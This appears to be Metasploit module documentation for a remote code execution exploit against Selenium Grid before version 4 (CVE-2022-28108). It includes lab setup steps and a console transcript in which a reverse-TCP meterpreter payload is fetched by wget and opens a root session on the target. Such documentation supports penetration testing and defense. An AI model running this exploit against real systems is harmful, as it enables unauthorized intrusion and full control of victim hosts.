## Vulnerable Application

Selenium Server (Grid) before 4 allows CSRF because it permits non-JSON content types
such as application/x-www-form-urlencoded, multipart/form-data, and text/plain.

The vulnerability affects:

    * Selenium Server (Grid) before 4

This module was successfully tested on:

    * selenium/standalone-chrome:3.141.59 installed with Docker on Ubuntu 24.0.4


### Installation

1. docker pull selenium/standalone-chrome:3.141.59

2. docker run -d -p 4444:4444 -p 7900:7900 --shm-size="2g" selenium/standalone-chrome:3.141.59


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/linux/http/selenium_greed_chrome_rce_cve_2022_28108`
4. Do: `run lhost=<lhost> rhost=<rhost>`
5. You should get a meterpreter


## Options


## Scenarios
```
msf6 > use exploit/linux/http/selenium_greed_chrome_rce_cve_2022_28108
[*] Using configured payload cmd/linux/http/x64/meterpreter_reverse_tcp
msf6 exploit(linux/http/selenium_greed_chrome_rce_cve_2022_28108) > options

Module options (exploit/linux/http/selenium_greed_chrome_rce_cve_2022_28108):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    4444             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       WGET             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      JCDnGOMpY        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain spaces
   LHOST                                yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/selenium_greed_chrome_rce_cve_2022_28108) > run lhost=192.168.56.1 rhost=192.168.56.16

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Expected error: unknown error: Chrome failed to start: exited normally.
  (unknown error: DevToolsActivePort file doesn't exist)
  (The process started from chrome location /usr/bin/python3 is no longer running, so ChromeDriver is assuming that Chrome has crashed.)
Build info: version: '3.141.59', revision: 'e82be7d358', time: '2018-11-14T08:25:53'
System info: host: 'e270e1bda998', ip: '172.17.0.2', os.name: 'Linux', os.arch: 'amd64', os.version: '6.8.0-51-generic', java.version: '1.8.0_292'
Driver info: driver.version: unknown
remote stacktrace: #0 0x5b8e0fc708f3 <unknown>
#1 0x5b8e0f755ba8 <unknown>
#2 0x5b8e0f778e33 <unknown>
#3 0x5b8e0f7749ef <unknown>
#4 0x5b8e0f7ae995 <unknown>
#5 0x5b8e0f7a8d63 <unknown>
#6 0x5b8e0f77f144 <unknown>
#7 0x5b8e0f780135 <unknown>
#8 0x5b8e0fc9fc3e <unknown>
#9 0x5b8e0fcb56b7 <unknown>
#10 0x5b8e0fca0b95 <unknown>
#11 0x5b8e0fcb6b05 <unknown>
#12 0x5b8e0fc952ab <unknown>
#13 0x5b8e0fcd1248 <unknown>
#14 0x5b8e0fcd13c8 <unknown>
#15 0x5b8e0fcec33d <unknown>
#16 0x72fc781a7609 start_thread

[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.16:50038) at 2024-12-26 23:30:24 +0900

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 20.04 (Linux 6.8.0-51-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```
